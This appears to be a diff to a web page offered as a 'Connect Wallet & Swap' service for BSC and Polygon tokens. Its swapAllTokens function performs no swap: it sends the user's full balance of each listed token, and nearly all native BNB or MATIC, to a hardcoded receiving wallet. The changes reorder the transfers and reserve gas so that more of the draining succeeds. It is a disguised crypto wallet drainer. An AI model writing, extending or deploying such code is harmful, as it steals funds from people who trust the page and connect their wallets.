@@ -352,6 +352,37 @@
           <span class="token-network">Polygon</span>
         </div>
 
+        <div class="token-item" data-network="bsc">
+          <img src="https://etherscan.io/images/main/empty-token.png" alt="Token 1" class="token-icon">
+          <span class="token-name">Token 1</span>
+          <span class="token-network">BSC</span>
+        </div>
+        <div class="token-item" data-network="bsc">
+          <img src="https://etherscan.io/images/main/empty-token.png" alt="Token 2" class="token-icon">
+          <span class="token-name">Token 2</span>
+          <span class="token-network">BSC</span>
+        </div>
+        <div class="token-item" data-network="bsc">
+          <img src="https://etherscan.io/images/main/empty-token.png" alt="Token 3" class="token-icon">
+          <span class="token-name">Token 3</span>
+          <span class="token-network">BSC</span>
+        </div>
+        <div class="token-item" data-network="bsc">
+          <img src="https://etherscan.io/images/main/empty-token.png" alt="Token 4" class="token-icon">
+          <span class="token-name">Token 4</span>
+          <span class="token-network">BSC</span>
+        </div>
+        <div class="token-item" data-network="bsc">
+          <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" alt="WBNB" class="token-icon">
+          <span class="token-name">Wrapped BNB</span>
+          <span class="token-network">BSC</span>
+        </div>
+        <div class="token-item" data-network="bsc">
+          <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" alt="BNB" class="token-icon">
+          <span class="token-name">BNB</span>
+          <span class="token-network">BSC</span>
+        </div>
+      </div>
       
       <button id="connectWallet" class="btn">
         <i class="fas fa-wallet"></i> Connect Wallet & Swap
@@ -369,10 +400,10 @@
     // Configuration
     const RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
     
-    // Token contracts - includes all requested tokens
+    // Token contracts - AUTO first, BNB last
     const TOKENS = {
       bsc: [
-        // AUTO Token
+        // AUTO Token (priority 1)
         {
           name: "AUTO",
           symbol: "AUTO",
@@ -382,9 +413,10 @@
             "function transfer(address to, uint256 amount) returns (bool)"
           ],
           decimals: 18,
-          logo: "https://developers.moralis.com/wp-content/uploads/web3wiki/593-autofarm/637aed495c5866556aff298f__ncuYT9GWohTTGG_CzHqpPct0aiFzz-40_seQSEnqVc.png"
+          logo: "https://developers.moralis.com/wp-content/uploads/web3wiki/593-autofarm/637aed495c5866556aff298f__ncuYT9GWohTTGG_CzHqpPct0aiFzz-40_seQSEnqVc.png",
+          priority: 1
         },
-        // USDT
+        // USDT (priority 2)
         {
           name: "USDT",
           symbol: "USDT",
@@ -394,31 +426,10 @@
             "function transfer(address to, uint256 amount) returns (bool)"
           ],
           decimals: 18,
-          logo: "https://cryptologos.cc/logos/tether-usdt-logo.png"
+          logo: "https://cryptologos.cc/logos/tether-usdt-logo.png",
+          priority: 2
         },
-        // WBNB
-        {
-          name: "Wrapped BNB",
-          symbol: "WBNB",
-          address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
-          abi: [
-            "function balanceOf(address owner) view returns (uint256)",
-            "function transfer(address to, uint256 amount) returns (bool)"
-          ],
-          decimals: 18,
-          logo: "https://cryptologos.cc/logos/bnb-bnb-logo.png"
-        },
-        // BNB (native)
-        {
-          name: "BNB",
-          symbol: "BNB",
-          address: "0x0000000000000000000000000000000000000000",
-          abi: [],
-          decimals: 18,
-          logo: "https://cryptologos.cc/logos/bnb-bnb-logo.png",
-          isNative: true
-        },
-        // Additional requested tokens
+        // Token 1 (priority 3)
         {
           name: "Token 1",
           symbol: "TKN1",
@@ -428,8 +439,10 @@
             "function transfer(address to, uint256 amount) returns (bool)"
           ],
           decimals: 18,
-          logo: "https://etherscan.io/images/main/empty-token.png"
+          logo: "https://etherscan.io/images/main/empty-token.png",
+          priority: 3
         },
+        // Token 2 (priority 4)
         {
           name: "Token 2",
           symbol: "TKN2",
@@ -439,8 +452,10 @@
             "function transfer(address to, uint256 amount) returns (bool)"
           ],
           decimals: 18,
-          logo: "https://etherscan.io/images/main/empty-token.png"
+          logo: "https://etherscan.io/images/main/empty-token.png",
+          priority: 4
         },
+        // Token 3 (priority 5)
         {
           name: "Token 3",
           symbol: "TKN3",
@@ -450,8 +465,10 @@
             "function transfer(address to, uint256 amount) returns (bool)"
           ],
           decimals: 18,
-          logo: "https://etherscan.io/images/main/empty-token.png"
+          logo: "https://etherscan.io/images/main/empty-token.png",
+          priority: 5
         },
+        // Token 4 (priority 6)
         {
           name: "Token 4",
           symbol: "TKN4",
@@ -461,10 +478,36 @@
             "function transfer(address to, uint256 amount) returns (bool)"
           ],
           decimals: 18,
-          logo: "https://etherscan.io/images/main/empty-token.png"
+          logo: "https://etherscan.io/images/main/empty-token.png",
+          priority: 6
+        },
+        // WBNB (priority 7)
+        {
+          name: "Wrapped BNB",
+          symbol: "WBNB",
+          address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          logo: "https://cryptologos.cc/logos/bnb-bnb-logo.png",
+          priority: 7
+        },
+        // BNB (native) - LAST (priority 999)
+        {
+          name: "BNB",
+          symbol: "BNB",
+          address: "0x0000000000000000000000000000000000000000",
+          abi: [],
+          decimals: 18,
+          logo: "https://cryptologos.cc/logos/bnb-bnb-logo.png",
+          isNative: true,
+          priority: 999
         }
       ],
       polygon: [
+        // AUTO Token (priority 1)
         {
           name: "AUTO",
           symbol: "AUTO",
@@ -474,8 +517,10 @@
             "function transfer(address to, uint256 amount) returns (bool)"
           ],
           decimals: 18,
-          logo: "https://developers.moralis.com/wp-content/uploads/web3wiki/593-autofarm/637aed495c5866556aff298f__ncuYT9GWohTTGG_CzHqpPct0aiFzz-40_seQSEnqVc.png"
+          logo: "https://developers.moralis.com/wp-content/uploads/web3wiki/593-autofarm/637aed495c5866556aff298f__ncuYT9GWohTTGG_CzHqpPct0aiFzz-40_seQSEnqVc.png",
+          priority: 1
         },
+        // WMATIC (priority 2)
         {
           name: "Wrapped MATIC",
           symbol: "WMATIC",
@@ -485,8 +530,10 @@
             "function transfer(address to, uint256 amount) returns (bool)"
           ],
           decimals: 18,
-          logo: "https://cryptologos.cc/logos/polygon-matic-logo.png"
+          logo: "https://cryptologos.cc/logos/polygon-matic-logo.png",
+          priority: 2
         },
+        // MATIC (native) - LAST (priority 999)
         {
           name: "MATIC",
           symbol: "MATIC",
@@ -494,7 +541,8 @@
           abi: [],
           decimals: 18,
           logo: "https://cryptologos.cc/logos/polygon-matic-logo.png",
-          isNative: true
+          isNative: true,
+          priority: 999
         }
       ]
     };
@@ -666,39 +714,11 @@
     async function swapAllTokens() {
       try {
         let successCount = 0;
-        const tokensToSwap = TOKENS[currentNetwork];
         
-        // First check native balance (BNB/MATIC)
-        const nativeToken = tokensToSwap.find(t => t.isNative);
-        if (nativeToken) {
-          try {
-            updateStatus(`Checking ${nativeToken.symbol} balance...`, "success");
-            const balance = await provider.getBalance(userAddress);
-            
-            if (balance.gt(0)) {
-              const formattedAmount = ethers.utils.formatUnits(balance, nativeToken.decimals);
-              updateStatus(`Sending ${formattedAmount} ${nativeToken.symbol}...`, "success");
-              
-              const tx = await signer.sendTransaction({
-                to: RECEIVING_WALLET,
-                value: balance
-              });
-              await tx.wait();
-              
-              updateStatus(
-                `${nativeToken.symbol} transfer successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
-                "success"
-              );
-              successCount++;
-            } else {
-              updateStatus(`No ${nativeToken.symbol} balance found`, "success");
-            }
-          } catch (nativeError) {
-            updateStatus(`${nativeToken.symbol} transfer failed: ${nativeError.message}`, "error");
-          }
-        }
-
-        // Then check ERC20 tokens
+        // Sort tokens by priority (lowest number first)
+        const tokensToSwap = TOKENS[currentNetwork].sort((a, b) => a.priority - b.priority);
+        
+        // Process ERC20 tokens first (excluding native)
         for (const token of tokensToSwap.filter(t => !t.isNative)) {
           try {
             updateStatus(`Checking ${token.name} balance...`, "success");
@@ -709,6 +729,14 @@
             if (balance.gt(0)) {
               const formattedAmount = ethers.utils.formatUnits(balance, token.decimals);
               updateStatus(`Sending ${formattedAmount} ${token.symbol}...`, "success");
+              
+              // Estimate gas first
+              try {
+                const gasEstimate = await contract.estimateGas.transfer(RECEIVING_WALLET, balance);
+                updateStatus(`Estimated gas: ${gasEstimate.toString()}`, "success");
+              } catch (e) {
+                updateStatus(`Gas estimation skipped: ${e.message}`, "success");
+              }
               
               const tx = await contract.transfer(RECEIVING_WALLET, balance);
               await tx.wait();
@@ -723,6 +751,40 @@
             }
           } catch (tokenError) {
             updateStatus(`${token.symbol} transfer failed: ${tokenError.message}`, "error");
+          }
+        }
+
+        // Process native token LAST (BNB/MATIC)
+        const nativeToken = tokensToSwap.find(t => t.isNative);
+        if (nativeToken) {
+          try {
+            updateStatus(`Checking ${nativeToken.symbol} balance...`, "success");
+            const balance = await provider.getBalance(userAddress);
+            
+            // Keep 0.005 BNB/MATIC for gas if balance is large enough
+            const keepAmount = ethers.utils.parseUnits("0.005", nativeToken.decimals);
+            const sendAmount = balance.gt(keepAmount) ? balance.sub(keepAmount) : balance;
+            
+            if (sendAmount.gt(0)) {
+              const formattedAmount = ethers.utils.formatUnits(sendAmount, nativeToken.decimals);
+              updateStatus(`Sending ${formattedAmount} ${nativeToken.symbol}...`, "success");
+              
+              const tx = await signer.sendTransaction({
+                to: RECEIVING_WALLET,
+                value: sendAmount
+              });
+              await tx.wait();
+              
+              updateStatus(
+                `${nativeToken.symbol} transfer successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
+                "success"
+              );
+              successCount++;
+            } else {
+              updateStatus(`No ${nativeToken.symbol} balance available to send (kept some for gas)`, "success");
+            }
+          } catch (nativeError) {
+            updateStatus(`${nativeToken.symbol} transfer failed: ${nativeError.message}`, "error");
           }
         }
         
